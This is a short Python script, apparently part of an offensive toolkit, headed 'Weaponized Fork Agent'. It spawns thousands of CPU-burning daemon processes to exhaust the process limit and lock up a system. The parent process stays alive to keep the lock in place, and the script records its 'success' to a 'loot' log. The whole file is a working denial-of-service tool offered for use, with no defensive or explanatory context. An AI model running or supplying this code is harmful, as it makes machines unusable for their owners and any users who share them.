import os
import sys
import time
import multiprocessing

def heavy_lifting():
    """Consumes CPU cycles to slow down system response."""
    while True:
        _ = 2 ** 10000

def fork_logic(limit=5000):
    """
    Weaponized Fork Agent: Controlled recursive process spawning 
    to hit the 'nproc' ulimit and deny new process creation.
    """
    print(f"[*] Initializing Resource Lock (Limit: {limit} processes)...")
    
    count = 0
    procs = []
    
    try:
        while count < limit:
            # Spawn a process that just stays alive and eats CPU
            p = multiprocessing.Process(target=heavy_lifting)
            p.daemon = True
            p.start()
            procs.append(p)
            count += 1
            
            if count % 100 == 0:
                print(f"[*] System Saturation: {count}/{limit} handles consumed.")
            
            # Short sleep to prevent immediate kernel panic, 
            # allowing the lock to settle deeper into the OS.
            time.sleep(0.01)

        print("[!!!] SUCCESS: System PID/CPU saturation achieved.")
        
        # Log to project loot
        loot_path = "../../../loot/forensic_history.log"
        with open(loot_path, "a") as log:
            log.write(f"Type: RESOURCE_LOCK | Procs: {count} | Status: LOCKED\n")

        # Keep the parent alive to maintain the children
        while True:
            time.sleep(60)

    except Exception as e:
        print(f"[-] Fork Fault (Likely reached system limit): {e}")

if __name__ == "__main__":
    # Default to 5000 processes, enough to hit most default 'ulimit -u'
    p_limit = int(sys.argv[1]) if len(sys.argv) > 1 else 5000
    fork_logic(p_limit)
